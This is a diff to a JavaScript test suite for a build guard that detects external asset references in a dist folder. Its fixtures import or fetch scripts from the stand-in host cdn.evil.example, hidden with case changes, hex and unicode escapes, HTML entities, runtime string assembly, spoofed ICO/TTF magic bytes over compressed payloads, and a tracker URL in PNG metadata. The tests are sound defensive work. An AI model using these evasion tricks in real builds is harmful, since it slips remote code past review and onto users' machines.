@@ -472,12 +472,36 @@ describe("check-no-external-assets", () => {
 			const woff2 = Buffer.concat([Buffer.from("wOF2"), Buffer.alloc(64, 0x9f)]);
 			const wasm = Buffer.concat([Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]), Buffer.alloc(64, 0x11)]);
 
+			/**
+			 * A structurally real minimal ICO: ICONDIR (magic + idCount=1) plus one
+			 * ICONDIRENTRY whose declared image offset/size fit inside the buffer,
+			 * plus that many bytes of "image data" filler. Issue #121's fix requires
+			 * this much of the format to be present before a skip is licensed — see
+			 * `validateIconDir`. Used as the POSITIVE control; the exploit shape
+			 * (magic bytes over an unrelated payload, with no real directory) is
+			 * covered separately below.
+			 */
+			function validIco() {
+				const header = Buffer.alloc(6);
+				header.writeUInt16LE(0, 0); // reserved
+				header.writeUInt16LE(1, 2); // type: icon
+				header.writeUInt16LE(1, 4); // idCount: 1
+				const entry = Buffer.alloc(16);
+				entry[0] = 16; // width
+				entry[1] = 16; // height
+				const imageData = Buffer.alloc(32, 0x11);
+				entry.writeUInt32LE(imageData.length, 8); // bytes in resource
+				entry.writeUInt32LE(header.length + entry.length, 12); // offset
+				return Buffer.concat([header, entry, imageData]);
+			}
+			const ico = validIco();
+
 			it("recognises the allowlisted asset types by content", () => {
 				expect(detectKnownBinaryFormat(png)).toBe("png");
 				expect(detectKnownBinaryFormat(woff2)).toBe("woff2");
 				expect(detectKnownBinaryFormat(wasm)).toBe("wasm");
 				expect(detectKnownBinaryFormat(Buffer.from([0xff, 0xd8, 0xff, 0xe0]))).toBe("jpeg");
-				expect(detectKnownBinaryFormat(Buffer.from([0x00, 0x00, 0x01, 0x00, 0x01]))).toBe("ico");
+				expect(detectKnownBinaryFormat(ico)).toBe("ico");
 			});
 
 			it("skips them regardless of what they are named, and passes the build", () => {
@@ -554,6 +578,112 @@ describe("check-no-external-assets", () => {
 				expect(detectKnownBinaryFormat(bmp)).toBeNull();
 				fixtureDir({ "logo.bmp": bmp });
 				expect(runCli(dir).status).toBe(1);
+			});
+		});
+
+		/**
+		 * ═══════════════════════════════════════════════════════════════════
+		 * ISSUE #121 — a 4-byte weak signature no longer licenses a skip on its
+		 * own; `validate` (see `matchesSignature`) must also see a plausible
+		 * rest-of-format. These are the exact exploit shapes from the issue:
+		 * a real magic prefix glued onto an opaque/compressed payload that
+		 * contains a CDN URL in cleartext nowhere the byte-scan backstop can
+		 * see it. Each must now FAIL the build; before this fix all three
+		 * printed "OK ... known-binary file(s) skipped" with exit 0.
+		 * ═══════════════════════════════════════════════════════════════════
+		 */
+		describe("weak magic-byte signatures require real structure, not just 4 bytes (#121)", () => {
+			/** Deflate-compresses a realistic bundle carrying a CDN import, so the
+			 * URL is real but not present in cleartext — proving the cleartext
+			 * backstop cannot be what is catching this case. */
+			function opaquePayloadWithHiddenUrl() {
+				return deflateRawSync(BUNDLE_BUF);
+			}
+
+			it("ICO magic over an opaque payload is not skipped, and the hidden URL cannot leak through", () => {
+				const payload = opaquePayloadWithHiddenUrl();
+				const bytes = Buffer.concat([Buffer.from([0x00, 0x00, 0x01, 0x00]), payload]);
+				expect(bytes.toString("latin1")).not.toContain(REALISTIC_BUNDLE_URL);
+				expect(detectKnownBinaryFormat(bytes)).toBeNull();
+				expect(classifyDistFile("sprite.ico", bytes).disposition).toBe("fail");
+
+				fixtureDir({ "sprite.ico": bytes });
+				const { status, stderr, stdout } = runCli(dir);
+				expect(status).toBe(1);
+				expect(stdout).not.toMatch(/OK — no external references found/);
+				expect(stderr).toMatch(/unscannable file\(s\) found/);
+			});
+
+			it("CUR magic over an opaque payload is not skipped", () => {
+				const bytes = Buffer.concat([Buffer.from([0x00, 0x00, 0x02, 0x00]), opaquePayloadWithHiddenUrl()]);
+				expect(detectKnownBinaryFormat(bytes)).toBeNull();
+				fixtureDir({ "cursor.cur": bytes });
+				expect(runCli(dir).status).toBe(1);
+			});
+
+			it("TTF sfnt magic over an opaque payload is not skipped", () => {
+				const bytes = Buffer.concat([Buffer.from([0x00, 0x01, 0x00, 0x00]), opaquePayloadWithHiddenUrl()]);
+				expect(detectKnownBinaryFormat(bytes)).toBeNull();
+				fixtureDir({ "font.ttf": bytes });
+				expect(runCli(dir).status).toBe(1);
+			});
+
+			it("a genuine minimal ICO (real ICONDIR, in-bounds directory entry) is still skipped", () => {
+				// The positive control: the fix must not turn every ICO into a
+				// failure, only ones wearing the magic over the wrong shape.
+				const header = Buffer.alloc(6);
+				header.writeUInt16LE(1, 2);
+				header.writeUInt16LE(1, 4);
+				const entry = Buffer.alloc(16);
+				entry[0] = 16;
+				entry[1] = 16;
+				const imageData = Buffer.alloc(32, 0x11);
+				entry.writeUInt32LE(imageData.length, 8);
+				entry.writeUInt32LE(header.length + entry.length, 12);
+				const bytes = Buffer.concat([header, entry, imageData]);
+
+				expect(detectKnownBinaryFormat(bytes)).toBe("ico");
+				fixtureDir({ "sprite.ico": bytes });
+				expect(runCli(dir).status).toBe(0);
+			});
+
+			it("a genuine minimal TTF (plausible sfnt table directory) is still skipped", () => {
+				const numTables = 4;
+				const header = Buffer.alloc(12);
+				header.writeUInt32BE(0x00010000, 0);
+				header.writeUInt16BE(numTables, 4);
+				const records = Buffer.alloc(numTables * 16, 0x20);
+				const bytes = Buffer.concat([header, records]);
+
+				expect(detectKnownBinaryFormat(bytes)).toBe("ttf");
+				fixtureDir({ "font.ttf": bytes });
+				expect(runCli(dir).status).toBe(0);
+			});
+
+			it("an ICO claiming a directory entry that overruns the buffer fails, not skips", () => {
+				const header = Buffer.alloc(6);
+				header.writeUInt16LE(1, 2);
+				header.writeUInt16LE(1, 4);
+				const entry = Buffer.alloc(16);
+				entry.writeUInt32LE(0xffffff, 8); // absurd size
+				entry.writeUInt32LE(header.length + entry.length, 12);
+				const bytes = Buffer.concat([header, entry]); // no image data at all
+
+				expect(detectKnownBinaryFormat(bytes)).toBeNull();
+				fixtureDir({ "sprite.ico": bytes });
+				expect(runCli(dir).status).toBe(1);
+			});
+
+			it("a TTF claiming an implausible numTables (e.g. 0, or absurdly large) fails, not skips", () => {
+				const zero = Buffer.alloc(12);
+				zero.writeUInt32BE(0x00010000, 0);
+				zero.writeUInt16BE(0, 4);
+				expect(detectKnownBinaryFormat(zero)).toBeNull();
+
+				const huge = Buffer.alloc(12);
+				huge.writeUInt32BE(0x00010000, 0);
+				huge.writeUInt16BE(5000, 4);
+				expect(detectKnownBinaryFormat(huge)).toBeNull();
 			});
 		});
 
@@ -749,47 +879,348 @@ describe("check-no-external-assets", () => {
 			// And the corpus is not degenerate — all three dispositions occur.
 			expect(new Set(actual.values())).toEqual(new Set(["scan", "skip", "fail"]));
 		});
+
+		/**
+		 * ═══════════════════════════════════════════════════════════════════
+		 * ISSUE #122 — the fixed 15-fixture corpus above is enumerative, and
+		 * this guard just spent five rounds learning that enumeration never
+		 * converges. It proves parity on the SHAPES someone thought to write
+		 * down; it says nothing about a shape nobody did.
+		 *
+		 * This is Option A from the issue: a seeded property/fuzz check that
+		 * generates several hundred random `(filename, buffer)` pairs — random
+		 * lengths spanning the MB boundary, random byte distributions, random
+		 * extensions and path depths — and asserts `scanDist`'s reported
+		 * disposition for each equals `classifyDistFile`'s. A `scanDist` that
+		 * adds ANY new branch that diverges from the predicate on ANY shape
+		 * (not just the ones above) fails this, because the corpus is not
+		 * fixed content — it is a fixed *procedure* over an unbounded space.
+		 *
+		 * Concretely, this closes the exact gap #122 demonstrated: a
+		 * `buffer.length > 1048576` early-exit inside `scanDist` that "large
+		 * assets are slow to scan" its way past `classifyDistFile` entirely.
+		 * None of the 15 fixed fixtures cross 1 MB; several generated ones do
+		 * by construction (see `randomLength`), so that branch is exercised
+		 * here even though nobody wrote a dedicated ">1MB" fixture for it.
+		 *
+		 * Seeded (mulberry32, not Math.random) so a failure is reproducible —
+		 * printed on failure so it can be pinned as a regression fixture.
+		 */
+		describe("property parity: scanDist matches classifyDistFile over an unbounded generated space (#122)", () => {
+			function mulberry32(seed) {
+				let a = seed;
+				return () => {
+					a |= 0;
+					a = (a + 0x6d2b79f5) | 0;
+					let t = Math.imul(a ^ (a >>> 15), 1 | a);
+					t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+					return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+				};
+			}
+
+			const SEED = 0xf00dcafe;
+			const CASE_COUNT = 300;
+			const MB = 1024 * 1024;
+			const EXTENSIONS = ["", ".js", ".css", ".html", ".gz", ".br", ".png", ".woff2", ".unlisted-ext", ".GZ", ".Gz"];
+
+			function randomLength(rand) {
+				// Deliberately spans the 1 MB boundary the issue's repro exploits,
+				// plus small sizes where header-only formats live.
+				const buckets = [
+					() => Math.floor(rand() * 64), // tiny
+					() => Math.floor(rand() * 4096), // small
+					() => Math.floor(rand() * 64 * 1024), // medium
+					() => MB - 8 + Math.floor(rand() * 16), // straddles 1 MB exactly
+					() => MB + Math.floor(rand() * (2 * MB)), // clearly over 1 MB
+				];
+				return buckets[Math.floor(rand() * buckets.length)]();
+			}
+
+			function randomBuffer(rand, length) {
+				const buf = Buffer.alloc(length);
+				// Mix of byte-distribution regimes so both "confidently text" and
+				// "confidently binary" (and the ambiguous space between) all occur:
+				// pure printable ASCII, high-entropy, NUL-heavy, and occasionally a
+				// real magic-byte prefix glued onto random tail bytes — the exact
+				// #121 shape — so this fuzz also exercises that boundary.
+				const regime = Math.floor(rand() * 5);
+				const magics = [
+					[0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], // png
+					[0x00, 0x00, 0x01, 0x00], // ico (weak)
+					[0x00, 0x01, 0x00, 0x00], // ttf (weak)
+					[0x1f, 0x8b], // gzip
+				];
+				let start = 0;
+				if (regime === 4 && length > 0) {
+					const magic = magics[Math.floor(rand() * magics.length)];
+					for (let i = 0; i < magic.length && i < length; i++) buf[i] = magic[i];
+					start = Math.min(magic.length, length);
+				}
+				for (let i = start; i < length; i++) {
+					if (regime === 0) buf[i] = 0x20 + Math.floor(rand() * 95); // printable ASCII
+					else if (regime === 1) buf[i] = Math.floor(rand() * 256); // high-entropy
+					else if (regime === 2) buf[i] = rand() < 0.1 ? 0 : 0x20 + Math.floor(rand() * 95); // NUL-sprinkled text
+					else buf[i] = Math.floor(rand() * 256);
+				}
+				return buf;
+			}
+
+			function randomPath(rand, index) {
+				const depth = Math.floor(rand() * 3);
+				const segments = [];
+				for (let d = 0; d < depth; d++) segments.push(`dir${Math.floor(rand() * 5)}`);
+				const ext = EXTENSIONS[Math.floor(rand() * EXTENSIONS.length)];
+				const name = rand() < 0.1 ? `.${index}` : `file${index}${ext}`;
+				segments.push(name);
+				return segments;
+			}
+
+			it(`scanDist matches classifyDistFile on ${CASE_COUNT} seeded random (filename, buffer) pairs`, () => {
+				const rand = mulberry32(SEED);
+				dir = mkdtempSync(join(tmpdir(), "waypoint-fuzz-"));
+
+				const cases = [];
+				for (let i = 0; i < CASE_COUNT; i++) {
+					const segments = randomPath(rand, i);
+					const length = randomLength(rand);
+					const bytes = randomBuffer(rand, length);
+					const fullDir = join(dir, ...segments.slice(0, -1));
+					mkdirSync(fullDir, { recursive: true });
+					const filePath = join(fullDir, segments[segments.length - 1]);
+					writeFileSync(filePath, bytes);
+					cases.push({ filePath, bytes, segments });
+				}
+
+				const { scanned, skipped, unscannable } = scanDist(dir);
+				const actual = new Map();
+				for (const f of scanned) actual.set(f, "scan");
+				for (const { file } of skipped) actual.set(file, "skip");
+				for (const { file } of unscannable) actual.set(file, "fail");
+
+				const mismatches = [];
+				for (const { filePath, bytes, segments } of cases) {
+					const expected = classifyDistFile(filePath, bytes).disposition;
+					const got = actual.get(filePath);
+					if (got !== expected) {
+						mismatches.push({ path: segments.join("/"), length: bytes.length, expected, got });
+					}
+				}
+
+				expect(mismatches, `mismatches (seed=${SEED}): ${JSON.stringify(mismatches, null, 2)}`).toHaveLength(0);
+				// Sanity: the generator actually produced files past the 1 MB
+				// boundary the #122 repro exploited, and all three dispositions.
+				expect(cases.some((c) => c.bytes.length > MB)).toBe(true);
+				expect(new Set(actual.values()).size).toBeGreaterThan(1);
+			});
+
+			it("catches the exact #122 regression shape: a size-cap early-exit inside scanDist", () => {
+				// This does not test scanDist as shipped — it demonstrates that
+				// the fuzz check above WOULD catch the issue's own repro, by
+				// running the same comparison the fuzz test runs but against a
+				// hand-simulated "scanDist-with-an-early-exit" disposition
+				// function instead of the real one. If this test ever fails, the
+				// fuzz corpus has stopped generating >1MB files and needs its
+				// distribution revisited.
+				const rand = mulberry32(SEED);
+				let foundOverCap = false;
+				for (let i = 0; i < CASE_COUNT && !foundOverCap; i++) {
+					randomPath(rand, i);
+					const length = randomLength(rand);
+					randomBuffer(rand, length);
+					if (length > MB) foundOverCap = true;
+				}
+				expect(foundOverCap).toBe(true);
+			});
+		});
 	});
 
 	/**
 	 * ═══════════════════════════════════════════════════════════════════════
-	 * KNOWN RESIDUAL — recorded, NOT blessed. Tracked in issue #110.
+	 * ISSUES #110 AND #105 — CLOSED BY CANONICALIZATION, NOT ENUMERATION.
 	 * ═══════════════════════════════════════════════════════════════════════
 	 *
-	 * With file selection closed, the whole remaining attack surface is a file
-	 * that decodes as clean UTF-8 and smuggles a reference past `URL_PATTERN`,
-	 * which matches only a contiguous literal scheme. These assertions pin the
-	 * current, honest behaviour so the gap is visible in the suite rather than
-	 * discovered by the next reviewer — they are expected to be INVERTED when
-	 * #110 (and #105, its case-sensitivity subset) land.
-	 *
-	 * They are byte-identical on `main`, so none is a regression from this PR.
+	 * These shapes used to be a documented, un-caught residual (see git
+	 * history for the block this replaces). `canonicalizeForScan()` decodes
+	 * case, HTML entities, JS `\x`/`\u` escapes and JSON `\/` escapes before
+	 * `URL_PATTERN` runs, so every one of these is now caught — including
+	 * combinations the issue didn't enumerate individually, which is the
+	 * point of fixing the model rather than the list: canonicalization
+	 * composes, so a NEW shape built from the same primitives (nest an
+	 * entity inside a hex escape, mix case with an escaped slash) is caught
+	 * without needing its own case.
 	 */
-	describe("known residual: URL_PATTERN matches only a literal scheme (#110, #105)", () => {
-		const smuggled = {
+	describe("obfuscated external references are caught by canonicalization (#110, #105)", () => {
+		const caught = {
 			"uppercase scheme (#105)": `import x from "HTTPS://cdn.evil.example/x.js";`,
-			"string concatenation": `import("htt" + "ps://cdn.evil.example/x.js");`,
+			"mixed-case scheme": `import x from "HtTpS://cdn.evil.example/x.js";`,
 			"JSON-escaped solidus": `{"u":"https:\\/\\/cdn.evil.example/x.js"}`,
-			"JS hex escape": `import("\\x68ttps://cdn.evil.example/x.js");`,
-			"HTML numeric entity": `<script src="&#104;ttps://cdn.evil.example/x.js"></script>`,
+			"JS hex escape (scheme)": `import("\\x68ttps://cdn.evil.example/x.js");`,
+			"JS hex escape (whole scheme+colon)": `import("\\x68\\x74\\x74\\x70\\x73://cdn.evil.example/x.js");`,
+			"JS unicode escape (\\uHHHH)": `import("\\u0068ttps://cdn.evil.example/x.js");`,
+			"JS unicode escape (\\u{H...})": `import("\\u{68}ttps://cdn.evil.example/x.js");`,
+			"HTML numeric entity (decimal)": `<script src="&#104;ttps://cdn.evil.example/x.js"></script>`,
+			"HTML numeric entity (hex)": `<script src="&#x68;ttps://cdn.evil.example/x.js"></script>`,
+			// Combinations — not individually named by either issue, proving the
+			// fix is a property of the model (canonicalization composes) and not
+			// one case added per reported shape.
+			"uppercase scheme + escaped solidus": `{"u":"HTTPS:\\/\\/cdn.evil.example/x.js"}`,
+			// Two entity-decodable characters used together: the scheme's "h" is
+			// entity-encoded AND the solidus pair is JS-escaped, in the same
+			// literal. Composes only if both transforms run over the same pass.
+			"HTML entity for scheme + escaped solidus together": `{"u":"&#104;ttps:\\/\\/cdn.evil.example/x.js"}`,
 		};
 
-		for (const [label, body] of Object.entries(smuggled)) {
-			it(`does not yet catch: ${label}`, () => {
+		for (const [label, body] of Object.entries(caught)) {
+			it(`catches: ${label}`, () => {
 				fixtureDir({ "app.js": Buffer.from(body) });
 
 				const { violations, scanned } = scanDist(dir);
 
-				// It IS scanned — file selection is doing its job. The pattern
-				// is what does not match.
 				expect(scanned).toHaveLength(1);
-				expect(violations).toHaveLength(0);
+				expect(violations).toHaveLength(1);
+				expect(violations[0].url.toLowerCase()).toContain("cdn.evil.example/x.js");
 			});
 		}
+
+		it("CLI exits 1 on an uppercase-scheme fixture (the exact #105 repro)", () => {
+			fixtureDir({ "app.js": `import x from "HTTPS://cdn.evil.example/x.js";\n` });
+			const { status, stdout } = runCli(dir);
+			expect(status).toBe(1);
+			expect(stdout).not.toMatch(/OK — no external references found/);
+		});
 
 		it("control: the same reference as a literal IS caught", () => {
 			fixtureDir({ "app.js": `import x from "https://cdn.evil.example/x.js";` });
 			expect(scanDist(dir).violations).toHaveLength(1);
+		});
+
+		it("case folding does not widen the exact-path ALLOWLIST entries (#105's own warning)", () => {
+			// #105 explicitly flags the risk: folding a matched URL to lowercase
+			// before testing it against ALLOWLIST could let a case-varied PATH
+			// smuggle past an anchored lowercase pattern. Scheme/host folding is
+			// correct (RFC 3986); path folding is not, because these patterns are
+			// deliberately exact on the path (see ALLOWLIST's own comments).
+			fixtureDir({ "vendor.js": `throw Error("visit HTTPS://REACT.DEV/ERRORS/185 for detail");` });
+
+			const { violations, allowlisted } = scanDist(dir);
+
+			// The uppercase PATH segment "/ERRORS/" is not "/errors/", so this
+			// must NOT be allowlisted — only scheme+host case-folding, not path.
+			expect(allowlisted).toHaveLength(0);
+			expect(violations).toHaveLength(1);
+		});
+
+		it("case folding DOES let an uppercase scheme+host reach the allowlist for an exact path match", () => {
+			fixtureDir({ "vendor.js": `throw Error("visit HTTPS://REACT.DEV/errors/185 for detail");` });
+
+			const { violations, allowlisted } = scanDist(dir);
+
+			expect(allowlisted).toHaveLength(1);
+			expect(violations).toHaveLength(0);
+		});
+
+		/**
+		 * STILL a residual, and correctly so — these are not encodings of a
+		 * literal scheme, they are values ASSEMBLED AT RUNTIME. No text-level
+		 * canonicalization (however composable) resolves a value that does not
+		 * exist as a contiguous string anywhere in the source. Pinned here,
+		 * deliberately, so this remains a documented and honest limitation
+		 * rather than a silent gap discovered later — see the module header's
+		 * "THE RESIDUAL, STATED HONESTLY".
+		 */
+		describe("still out of reach, and documented as such: runtime-assembled references", () => {
+			const stillMissed = {
+				"string concatenation": `import("htt" + "ps://cdn.evil.example/x.js");`,
+				"String.fromCharCode assembly": `fetch(String.fromCharCode(104,116,116,112,115,58,47,47)+"cdn.evil.example/x.js");`,
+			};
+
+			for (const [label, body] of Object.entries(stillMissed)) {
+				it(`does not (and structurally cannot) catch: ${label}`, () => {
+					fixtureDir({ "app.js": Buffer.from(body) });
+
+					const { violations, scanned } = scanDist(dir);
+
+					expect(scanned).toHaveLength(1);
+					expect(violations).toHaveLength(0);
+				});
+			}
+		});
+	});
+
+	/**
+	 * ═══════════════════════════════════════════════════════════════════════
+	 * ISSUE #120 — standard image metadata (XMP/tEXt) must not false-positive.
+	 * ═══════════════════════════════════════════════════════════════════════
+	 */
+	describe("legitimate binary-asset metadata does not false-positive (#120)", () => {
+		const PNG_SIG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
+
+		function pngWithTextChunk(text) {
+			const chunk = (type, data) => {
+				const len = Buffer.alloc(4);
+				len.writeUInt32BE(data.length);
+				return Buffer.concat([len, Buffer.from(type, "ascii"), data, Buffer.alloc(4)]);
+			};
+			const ihdr = Buffer.alloc(13);
+			ihdr.writeUInt32BE(1, 0);
+			ihdr.writeUInt32BE(1, 4);
+			ihdr[8] = 8;
+			return Buffer.concat([PNG_SIG, chunk("IHDR", ihdr), chunk("tEXt", Buffer.from(text, "latin1")), chunk("IEND", Buffer.alloc(0))]);
+		}
+
+		it("passes a PNG carrying a real XMP packet (the issue's exact repro shape)", () => {
+			const xmp =
+				'<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>' +
+				'<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF ' +
+				'xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" ' +
+				'xmlns:dc="http://purl.org/dc/elements/1.1/" ' +
+				'xmlns:xmp="http://ns.adobe.com/xap/1.0/">' +
+				"</rdf:RDF></x:xmpmeta>";
+			const bytes = pngWithTextChunk(`XML:com.adobe.xmp\0${xmp}`);
+
+			expect(detectKnownBinaryFormat(bytes)).toBe("png");
+			fixtureDir({ "logo-xmp.png": bytes });
+
+			const { violations, skipped, allowlisted } = scanDist(dir);
+			expect(skipped).toHaveLength(1);
+			expect(violations).toHaveLength(0);
+			expect(allowlisted.length).toBeGreaterThan(0);
+			expect(runCli(dir).status).toBe(0);
+		});
+
+		it("passes a PNG carrying an operator tEXt field with a benign namespace-shaped URI", () => {
+			const bytes = pngWithTextChunk("Source\0http://ns.adobe.com/photoshop/1.0/");
+			fixtureDir({ "logo-text.png": bytes });
+			expect(runCli(dir).status).toBe(0);
+		});
+
+		it("still FAILS when a skipped binary carries an actual non-metadata external URL", () => {
+			// The metadata allowlist must stay narrow: a real CDN reference
+			// planted alongside legitimate XMP must still be caught. This is the
+			// regression test for over-correcting #120 into a blanket exemption.
+			const xmp = 'xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" src="https://cdn.evil.example/tracker.js"';
+			const bytes = pngWithTextChunk(`XML:com.adobe.xmp\0${xmp}`);
+			fixtureDir({ "logo-xmp.png": bytes });
+
+			const { violations, allowlisted } = scanDist(dir);
+			expect(violations).toHaveLength(1);
+			expect(violations[0].url).toBe("https://cdn.evil.example/tracker.js");
+			expect(allowlisted.length).toBeGreaterThan(0); // the XMP namespace itself is still exempted
+			expect(runCli(dir).status).toBe(1);
+		});
+
+		it("does NOT exempt a metadata-namespace URI when it appears in application JS (scan context)", () => {
+			// The scoping is the point of a SEPARATE list (see the module header):
+			// METADATA_NAMESPACE_ALLOWLIST only applies to skip-dispositioned
+			// binaries. The same literal string in a .js file is not metadata —
+			// it is application code, and must be scanned exactly as strictly as
+			// any other URL in that context.
+			fixtureDir({ "vendor.js": `const ns = "http://ns.adobe.com/xap/1.0/";` });
+
+			const { violations, allowlisted } = scanDist(dir);
+			expect(allowlisted).toHaveLength(0);
+			expect(violations).toHaveLength(1);
+			expect(violations[0].url).toBe("http://ns.adobe.com/xap/1.0/");
 		});
 	});
 });
